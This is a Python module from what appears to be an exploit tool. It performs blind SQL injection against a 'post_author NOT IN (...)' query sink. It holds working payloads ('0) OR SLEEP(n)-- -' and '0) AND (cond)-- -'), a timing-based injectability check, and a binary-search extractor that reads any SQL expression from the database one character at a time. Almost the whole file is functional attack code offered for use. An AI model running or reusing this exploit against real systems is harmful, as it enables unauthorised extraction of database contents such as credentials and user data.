"""Blind SQL injection oracles and a string extractor over the route-confusion sink.

The injected value lands inside the query as:

    ... post_author NOT IN (<value>) ...

so a value of ``0) <sql>-- -`` closes the IN() list and appends arbitrary SQL.
"""

from __future__ import annotations

import statistics
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

from .client import BatchClient

_MIN_PRINTABLE = 32
_MAX_PRINTABLE = 126


@dataclass
class TimingConfirmation:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: Tuple[Tuple[float, float], ...]


class BlindSQLi:
    def __init__(self, client: BatchClient, *, sleep: float = 3.0) -> None:
        self.client = client
        self.sleep = sleep
        self.requests = 0

    def confirm(self) -> Tuple[bool, float, float]:
        """Confirm injectability with a differential time delay.

        Returns ``(confirmed, baseline_seconds, delayed_seconds)``. This reads no database
        content and modifies nothing.
        """
        result = self.confirm_timing(samples=1)
        return result.confirmed, result.baseline, result.delayed

    def confirm_timing(self, *, samples: int = 3) -> TimingConfirmation:
        """Confirm injectability with paired timing samples.

        Network jitter makes a single baseline/delayed pair brittle, so this alternates
        baseline and delayed requests and compares median paired deltas.
        """
        if samples < 1:
            raise ValueError("samples must be at least 1")

        pairs = []
        for _ in range(samples):
            baseline = self._elapsed("SLEEP(0)")
            delayed = self._elapsed(f"SLEEP({self.sleep:g})")
            pairs.append((baseline, delayed))

        baselines = [pair[0] for pair in pairs]
        delayed = [pair[1] for pair in pairs]
        deltas = [delay - base for base, delay in pairs]
        baseline_median = statistics.median(baselines)
        delayed_median = statistics.median(delayed)
        delta_median = statistics.median(deltas)
        threshold = max(0.75, self.sleep * 0.65)
        confirmed = delta_median >= threshold
        return TimingConfirmation(
            confirmed=confirmed,
            baseline=baseline_median,
            delayed=delayed_median,
            delta=delta_median,
            threshold=threshold,
            samples=tuple(pairs),
        )

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        """Read a string-valued SQL expression one character at a time (binary search)."""
        chars = []
        for position in range(1, max_length + 1):
            # COALESCE keeps a NULL result from short-circuiting into an empty read.
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{position},1))"
            if not self._true(f"{probe} > 0"):
                break
            low, high = _MIN_PRINTABLE, _MAX_PRINTABLE
            while low < high:
                mid = (low + high) // 2
                if self._true(f"{probe} > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            chars.append(chr(low))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        """Read an integer-valued SQL expression.

        Raises ValueError when the extracted text is not an integer, so a
        failed extraction cannot be mistaken for a real count of zero.
        """
        text = self.extract(expression).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _elapsed(self, sql: str) -> float:
        self.requests += 1
        return self.client.inject(f"0) OR {sql}-- -").elapsed

    def _true(self, condition: str) -> bool:
        # get_items() returns rows only when the appended boolean condition holds.
        self.requests += 1
        return bool(self.client.rows(self.client.inject(f"0) AND ({condition})-- -")))
